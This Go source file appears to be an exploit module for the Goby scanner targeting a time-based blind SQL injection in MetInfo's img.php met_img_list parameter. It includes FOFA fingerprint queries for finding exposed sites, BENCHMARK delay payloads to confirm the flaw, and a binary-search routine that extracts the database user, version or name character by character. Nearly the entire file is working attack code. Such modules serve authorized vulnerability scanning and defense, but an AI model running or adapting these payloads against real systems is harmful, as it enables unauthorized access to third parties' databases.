package exploits

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "metinfo SQL时间延时注入漏洞3",
    "Description": "未进行有效过滤，导致SQL注入漏洞",
    "Product": "Metinfo",
    "Homepage": "www.metinfo.cn",
    "DisclosureDate": "2017-06-16",
    "Author": "mahui@gobies.org",
    "FofaQuery": "(title=\"Powered by MetInfo\" || body=\"content=\\\"MetInfo\" || body=\"powered_by_metinfo\" || body=\"/images/css/metinfo.css\")",
    "Level": "2",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "8.0",
    "VulType": [
        "SQL注入"
    ],
    "Impact": "<p>可注入服务器数据库敏感信息</p>",
    "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.metinfo.cn/\">https://www.metinfo.cn/</a></p><p>1、部署Web应⽤防⽕墙，对数据库操作进⾏监控。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "runSql",
            "type": "select",
            "value": "user(),version(),database()"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "SQL注入"
    ],
    "CVEIDs": [],
    "CVSSScore": "8.0",
    "AttackSurfaces": {
        "Application": [
            "Metinfo"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "GobyQuery": "(title=\"Powered by MetInfo\" || body=\"content=\\\"MetInfo\" || body=\"powered_by_metinfo\" || body=\"/images/css/metinfo.css\")",
    "PocId": "10688"
}`

	rundownloadPayload3 := func(hostinfo *httpclient.FixUrl, payload0 string, value, operation int, url string) bool {

		payload := ""
		if operation == 0 {
			payload = fmt.Sprintf("11+procedure+analyse(extractvalue(rand(),concat(0x3a,(if((" + payload0 + "=+" + strconv.Itoa(value) + "),BENCHMARK(10000000,SHA1(1)),1)))),1)")
		} else if operation == 1 {
			payload = fmt.Sprintf("11+procedure+analyse(extractvalue(rand(),concat(0x3a,(if((" + payload0 + "<+" + strconv.Itoa(value) + "),BENCHMARK(10000000,SHA1(1)),1)))),1)")
		} else if operation == 2 {
			payload = fmt.Sprintf("11+procedure+analyse(extractvalue(rand(),concat(0x3a,(if((" + payload0 + ">+" + strconv.Itoa(value) + "),BENCHMARK(10000000,SHA1(1)),1)))),1)")
		}
		cfg := httpclient.NewGetRequestConfig(url + payload)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.DenyFollwRedirectOutHost = true
		sql1time0 := time.Now()
		var sql1time time.Duration
		_, err := httpclient.DoHttpRequest(hostinfo, cfg)
		if err == nil {
			sql1time1 := time.Now()
			sql1time = sql1time1.Sub(sql1time0)
		}
		time.Sleep(4 * time.Second)
		if sql1time.Seconds() > 4 {
			return true
		}

		return false
	}

	gedownloadtlen3 := func(hostinfo *httpclient.FixUrl, payloadlen string, url string) (len int) {

		leftlen := 0
		rightlen := 20
		midlen := 0

		for leftlen <= rightlen {
			midlen = (leftlen + rightlen) / 2
			if rundownloadPayload3(hostinfo, payloadlen, midlen, 0, url) {
				len = midlen
				return len
			} else if rundownloadPayload3(hostinfo, payloadlen, midlen, 1, url) {
				rightlen = midlen - 1
			} else {
				leftlen = midlen + 1
			}
		}
		return 0
	}

	gedownloadtSessLetter3 := func(hostinfo *httpclient.FixUrl, i int, payload0 string, url string) (results string) {
		/*
			使用二分法猜测字符
			每个字符的可能字符为数字和字母
			ASCII 码从 48 到 122
		*/
		left := 32
		right := 122
		mid := 0

		payload := "ascii(substring((" + payload0 + ")," + strconv.Itoa(i) + "," + strconv.Itoa(i) + "))"
		for left <= right {
			mid = (left + right) / 2
			if rundownloadPayload3(hostinfo, payload, mid, 0, url) {
				return string(mid)
			} else if rundownloadPayload3(hostinfo, payload, mid, 1, url) {
				right = mid - 1
			} else {
				left = mid + 1
			}
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			//httpclient.SetDefaultProxy("http://127.0.0.1:8082")
			url := "/img/img.php?lang=metinfo&metinfover=1&class1=10001&imglistid=10001&met_img_list=1"
			sql1 := "1+procedure+analyse(extractvalue(rand(),concat(0x3a,(if((1=2),BENCHMARK(8000000,SHA1(1)),1)))),1)"
			sql2 := "1+procedure+analyse(extractvalue(rand(),concat(0x3a,(if((hex(md5(123))=3230326362393632616335393037356239363462303731353264323334623730),BENCHMARK(8000000,SHA1(1)),1)))),1)"

			metsql1 := httpclient.NewGetRequestConfig(url + sql1)
			metsql1.VerifyTls = false
			metsql1.FollowRedirect = false
			sql1Time0 := time.Now()
			var sql1time time.Duration
			if _, err := httpclient.DoHttpRequest(u, metsql1); err == nil {
				sql1Time1 := time.Now()
				sql1time = sql1Time1.Sub(sql1Time0)
			}

			metsql2 := httpclient.NewGetRequestConfig(url + sql2)
			metsql2.VerifyTls = false
			metsql2.FollowRedirect = false
			sql2Time0 := time.Now()
			var sql2time time.Duration
			if _, err := httpclient.DoHttpRequest(u, metsql2); err == nil {
				sql2Time1 := time.Now()
				sql2time = sql2Time1.Sub(sql2Time0)
			}

			if sql1time.Seconds() < 4 && sql2time.Seconds() > 4 {
				return true
			}

			return false
		},

		//goscanner.exe -m ..\..\exploits\metinfo_img_met_img_list_sqli.go -t zfp.cn

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			//httpclient.SetDefaultProxy("http://127.0.0.1:8082")
			url := "/img/img.php?lang=metinfo&metinfover=1&class1=10001&imglistid=10001&met_img_list=1"

			//payload0:="USER()"
			payload0 := ""
			switch ss.Params["runSql"].(string) {
			case "user()":
				payload0 = "USER()"
			case "version()":
				payload0 = "version()"
			case "database()":
				payload0 = "database()"
			}

			payloadlen := "LENGTH(" + payload0 + ")"

			len := gedownloadtlen3(expResult.HostInfo, payloadlen, url)
			if len == 0 {
				return expResult
			}

			result := ""
			i := 1
			var results []string

			for i <= len {
				result = gedownloadtSessLetter3(expResult.HostInfo, i, payload0, url)
				if result == "" {
					result = "获取失败"
				}
				results = append(results, result)
				i = i + 1
			}

			output := strings.Join(results, "")
			resultss := []byte(output)
			var resultsn []string

			for ii, item := range resultss {
				iii := ii + 1
				payload := "ascii(substring((" + payload0 + ")," + strconv.Itoa(iii) + "," + strconv.Itoa(iii) + "))"
				if rundownloadPayload3(expResult.HostInfo, payload, int(item), 0, url) {
					resultsn = append(resultsn, string(item))
				} else {
					result := gedownloadtSessLetter3(expResult.HostInfo, iii, payload0, url)
					resultsn = append(resultsn, result)
				}
			}

			output = strings.Join(resultsn, "")
			if output != "" {
				expResult.Output = output
				expResult.Success = true
			}
			return expResult
		},
	))
}
